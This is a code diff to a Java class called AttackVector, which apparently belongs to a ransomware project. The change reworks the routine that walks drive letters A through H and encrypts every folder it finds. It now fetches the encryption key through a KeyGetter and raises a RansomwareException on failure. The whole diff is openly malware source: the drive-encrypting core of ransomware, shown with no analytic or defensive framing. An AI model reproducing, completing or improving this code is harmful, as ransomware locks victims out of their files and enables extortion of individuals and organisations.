@@ -5,6 +5,7 @@ import java.util.Collection;
 import java.util.Collections;
 
 import Agent.entites.CryptoKey;
+import Agent.exceptions.RansomwareException;
 import Agent.traversal.*;
 
 public class AttackVector {
@@ -17,13 +18,15 @@ public class AttackVector {
 		bfs.traverseAndEncrypt(inputDir, dirs, key);
 	}
 
-	public void encryptFileSystem(CryptoKey clientKey) {
-
-		Collection<File> visitedFolders = Collections.emptySet();
-		for (char i = 'A'; i <= 'H'; i++) {
-			attack(i + ":\\", visitedFolders, clientKey);
-
+	public void encryptFileSystem() throws RansomwareException {
+		try {
+			KeyGetter key = new KeyGetter();
+			Collection<File> visitedFolders = Collections.emptySet();
+			for (char i = 'A'; i <= 'H'; i++) {
+				attack(i + ":\\", visitedFolders, key.getKey());
+			}
+		} catch (Exception e) {
+			throw new RansomwareException();
 		}
-
 	}
 }
